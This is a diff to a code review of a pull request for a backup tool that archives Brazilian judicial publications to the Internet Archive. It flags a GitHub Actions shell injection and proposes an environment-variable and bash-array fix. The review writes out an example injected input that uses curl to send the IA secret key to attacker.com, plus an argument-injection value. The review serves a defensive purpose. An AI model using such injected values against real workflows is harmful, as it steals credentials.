@@ -1,5 +1,9 @@
 # Code Review: PR #1 — Add complete DJEN backup system to Internet Archive
 
+> **Note:** All file paths below reference code from
+> [PR #1](https://github.com/franklinbaldo/djen-backup/pull/1)
+> (`claude/build-djen-backup-tool-yOUM6` branch), not this branch.
+
 ## Overall Assessment
 
 Well-structured project implementing a backup pipeline for Brazilian judicial
@@ -21,16 +25,17 @@ user with write access could supply an input like
 `; curl attacker.com/exfil?s=$IAS3_SECRET_KEY` as a tribunal name, exfiltrating
 the IA credentials.
 
-**Fix:** Use environment variables instead of inline interpolation:
+**Fix:** Pass inputs via environment variables (not inline `${{ }}`) and build
+a proper argument array to prevent both shell injection and argument injection:
 
 ```yaml
 - name: Run backup
   run: |
-    args=""
-    [ -n "$START_DATE" ] && args="$args --start-date $START_DATE"
-    [ -n "$END_DATE" ] && args="$args --end-date $END_DATE"
-    [ -n "$TRIBUNAL" ] && args="$args --tribunal $TRIBUNAL"
-    uv run djen-backup $args --deadline-minutes 45 --state-file .cache/state.json
+    args=()
+    [ -n "$START_DATE" ] && args+=(--start-date "$START_DATE")
+    [ -n "$END_DATE" ] && args+=(--end-date "$END_DATE")
+    [ -n "$TRIBUNAL" ] && args+=(--tribunal "$TRIBUNAL")
+    uv run djen-backup "${args[@]}" --deadline-minutes 45 --state-file .cache/state.json
   env:
     START_DATE: ${{ inputs.start_date }}
     END_DATE: ${{ inputs.end_date }}
@@ -38,6 +43,11 @@ the IA credentials.
     IAS3_ACCESS_KEY: ${{ secrets.IA_ACCESS_KEY }}
     IAS3_SECRET_KEY: ${{ secrets.IA_SECRET_KEY }}
 ```
+
+Using an array (`args+=()`) with `"${args[@]}"` ensures each argument is
+properly quoted and isolated — a value like `TJSP --state-file /tmp/x` would
+be passed as a single `--tribunal` argument rather than being split into
+multiple CLI flags.
 
 ### 2. No input validation on `--tribunal` CLI argument
 
